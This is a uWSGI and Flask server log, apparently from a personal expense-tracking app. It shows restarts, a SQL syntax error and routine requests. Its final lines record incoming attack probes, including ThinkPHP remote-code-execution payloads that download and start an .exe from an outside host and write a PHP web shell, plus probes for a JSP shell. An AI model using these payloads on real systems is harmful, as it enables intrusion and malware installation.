+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1eaa430 pid: 12422 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 12422)
+spawned uWSGI worker 1 (pid: 12756, cores: 1)
+spawned uWSGI http 1 (pid: 12757)
+Tue Jan  7 13:59:44 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 12757)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12756)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 4 mapped to socket 0 (127.0.0.1:46597)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 13:59:45 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:33976 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xa8b430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xa8b430 pid: 12422 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 12422)
+spawned uWSGI worker 1 (pid: 12840, cores: 1)
+spawned uWSGI http 1 (pid: 12841)
+gateway "uWSGI http 1" has been buried (pid: 12841)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:33976)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 13:59:49 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:41164 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1d91430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1d91430 pid: 12422 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 12422)
+spawned uWSGI worker 1 (pid: 12847, cores: 1)
+spawned uWSGI http 1 (pid: 12848)
+Tue Jan  7 13:59:58 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 13:59:59 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:42384 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x7de4b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x7de4b0 pid: 12857 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 12857)
+spawned uWSGI worker 1 (pid: 12860, cores: 1)
+spawned uWSGI http 1 (pid: 12861)
+[pid: 12860|app: 0|req: 1/1] 127.0.0.1 () {42 vars in 753 bytes} [Tue Jan  7 14:00:11 2020] GET / => generated 3717 bytes in 10 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, bankcard) VALUES ( '2020-01-07,'测试正负',-0.01) ;
+[2020-01-07 14:00:15,522] ERROR in app: Exception on /insertresult [POST]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 2446, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 1951, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 1820, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 1949, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.6/site-packages/flask/app.py", line 1935, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/python/flask/bill/app.py", line 17, in insertresult
+    insert_bill(noun4,noun5,noun1)
+  File "/home/python/flask/bill/operate_data.py", line 50, in insert_bill
+    cursor.execute(sql)
+  File "/usr/local/lib/python3.6/site-packages/mysql/connector/cursor.py", line 551, in execute
+    self._handle_result(self._connection.cmd_query(stmt))
+  File "/usr/local/lib/python3.6/site-packages/mysql/connector/connection.py", line 490, in cmd_query
+    result = self._handle_result(self._send_cmd(ServerCmd.QUERY, query))
+  File "/usr/local/lib/python3.6/site-packages/mysql/connector/connection.py", line 395, in _handle_result
+    raise errors.get_exception(packet)
+mysql.connector.errors.ProgrammingError: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '测试正负',-0.01)' at line 1
+[pid: 12860|app: 0|req: 2/2] 127.0.0.1 () {52 vars in 973 bytes} [Tue Jan  7 14:00:15 2020] POST /insertresult => generated 290 bytes in 102 msecs (HTTP/1.0 500) 2 headers in 84 bytes (1 switches on core 0)
+Tue Jan  7 14:01:16 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 12861)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12860)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:42384)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 14:01:17 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:36208 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x910430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x910430 pid: 12857 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 12857)
+spawned uWSGI worker 1 (pid: 12955, cores: 1)
+spawned uWSGI http 1 (pid: 12956)
+Tue Jan  7 14:01:23 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 12956)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12955)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 4 mapped to socket 0 (127.0.0.1:36208)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 14:01:24 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:34877 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x827430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x827430 pid: 12857 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 12857)
+spawned uWSGI worker 1 (pid: 12963, cores: 1)
+spawned uWSGI http 1 (pid: 12964)
+Tue Jan  7 14:01:28 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 12964)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12963)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:34877)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 14:01:29 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:32945 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xe79430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe79430 pid: 12857 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 12857)
+spawned uWSGI worker 1 (pid: 12979, cores: 1)
+spawned uWSGI http 1 (pid: 12980)
+Tue Jan  7 14:02:29 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 12980)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12979)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 4 mapped to socket 0 (127.0.0.1:32945)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 14:02:30 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:44407 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1542430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1542430 pid: 12857 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 12857)
+spawned uWSGI worker 1 (pid: 13038, cores: 1)
+spawned uWSGI http 1 (pid: 13039)
+gateway "uWSGI http 1" has been buried (pid: 13039)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:44407)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 14:02:32 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:37367 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x20c7430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x20c7430 pid: 12857 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 12857)
+spawned uWSGI worker 1 (pid: 13042, cores: 1)
+spawned uWSGI http 1 (pid: 13043)
+Tue Jan  7 14:02:41 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 14:02:42 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:45196 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1a0b4b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1a0b4b0 pid: 13052 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 13052)
+spawned uWSGI worker 1 (pid: 13054, cores: 1)
+spawned uWSGI http 1 (pid: 13055)
+INSERT INTO bill (date, detail, bankcard) VALUES ( '2020-01-07','测试正负',-0.01) ;
+[pid: 13054|app: 0|req: 1/1] 127.0.0.1 () {52 vars in 973 bytes} [Tue Jan  7 14:02:50 2020] POST /insertresult => generated 304 bytes in 37 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 2/2] 127.0.0.1 () {32 vars in 464 bytes} [Tue Jan  7 15:01:47 2020] GET /robots.txt => generated 232 bytes in 8 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 3/3] 127.0.0.1 () {36 vars in 724 bytes} [Tue Jan  7 15:01:49 2020] GET / => generated 3717 bytes in 3 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 4/4] 127.0.0.1 () {34 vars in 579 bytes} [Tue Jan  7 19:33:04 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 5/5] 127.0.0.1 () {34 vars in 513 bytes} [Tue Jan  7 19:33:10 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 6/6] 127.0.0.1 () {34 vars in 489 bytes} [Tue Jan  7 19:33:10 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 7/7] 127.0.0.1 () {34 vars in 473 bytes} [Tue Jan  7 19:33:10 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 8/8] 127.0.0.1 () {34 vars in 473 bytes} [Tue Jan  7 19:33:10 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 9/9] 127.0.0.1 () {36 vars in 586 bytes} [Tue Jan  7 19:33:10 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, zhongxincredit) VALUES ( '2020-01-07','晚饭',-25) ;
+[pid: 13054|app: 0|req: 10/10] 127.0.0.1 () {42 vars in 761 bytes} [Tue Jan  7 19:33:26 2020] POST /insertresult => generated 304 bytes in 25 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 11/11] 127.0.0.1 () {36 vars in 723 bytes} [Wed Jan  8 03:11:22 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 12/12] 127.0.0.1 () {32 vars in 463 bytes} [Wed Jan  8 03:11:23 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 13/13] 127.0.0.1 () {30 vars in 398 bytes} [Wed Jan  8 05:09:02 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 14/14] 127.0.0.1 () {34 vars in 579 bytes} [Wed Jan  8 08:12:53 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 15/15] 127.0.0.1 () {34 vars in 513 bytes} [Wed Jan  8 08:12:54 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 16/16] 127.0.0.1 () {34 vars in 487 bytes} [Wed Jan  8 08:12:54 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 17/17] 127.0.0.1 () {34 vars in 472 bytes} [Wed Jan  8 08:12:54 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 18/18] 127.0.0.1 () {34 vars in 472 bytes} [Wed Jan  8 08:12:54 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, zhongxincredit) VALUES ( '2020-01-08','早饭',-14.4) ;
+[pid: 13054|app: 0|req: 19/19] 127.0.0.1 () {42 vars in 760 bytes} [Wed Jan  8 08:13:08 2020] POST /insertresult => generated 304 bytes in 32 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 20/20] 127.0.0.1 () {46 vars in 780 bytes} [Wed Jan  8 09:39:25 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 21/21] 127.0.0.1 () {34 vars in 702 bytes} [Wed Jan  8 09:53:25 2020] GET /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 22/22] 127.0.0.1 () {34 vars in 579 bytes} [Wed Jan  8 11:15:51 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 23/23] 127.0.0.1 () {34 vars in 513 bytes} [Wed Jan  8 11:15:51 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 24/24] 127.0.0.1 () {34 vars in 489 bytes} [Wed Jan  8 11:15:51 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 25/25] 127.0.0.1 () {34 vars in 473 bytes} [Wed Jan  8 11:15:51 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 26/26] 127.0.0.1 () {34 vars in 473 bytes} [Wed Jan  8 11:15:51 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, huabei) VALUES ( '2020-01-08','午饭',-20.1) ;
+[pid: 13054|app: 0|req: 27/27] 127.0.0.1 () {42 vars in 761 bytes} [Wed Jan  8 11:16:04 2020] POST /insertresult => generated 304 bytes in 22 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 28/28] 127.0.0.1 () {38 vars in 546 bytes} [Wed Jan  8 11:45:32 2020] PUT /FxCodeShell.jsp%20 => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 29/29] 127.0.0.1 () {38 vars in 560 bytes} [Wed Jan  8 11:45:32 2020] PUT /FxCodeShell.jsp::$DATA => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 30/30] 127.0.0.1 () {38 vars in 542 bytes} [Wed Jan  8 11:45:32 2020] PUT /FxCodeShell.jsp/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 31/31] 127.0.0.1 () {34 vars in 703 bytes} [Wed Jan  8 11:45:32 2020] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fk.openyourass.icu/download.exe => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 32/32] 127.0.0.1 () {34 vars in 1377 bytes} [Wed Jan  8 12:16:01 2020] GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fk.openyourass.icu/download.exe','%SystemRoot%/Temp/zzsqngpfmwkmvka11893.exe');start%20%SystemRoot%/Temp/zzsqngpfmwkmvka11893.exe => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 33/33] 127.0.0.1 () {34 vars in 962 bytes} [Wed Jan  8 12:16:01 2020] GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
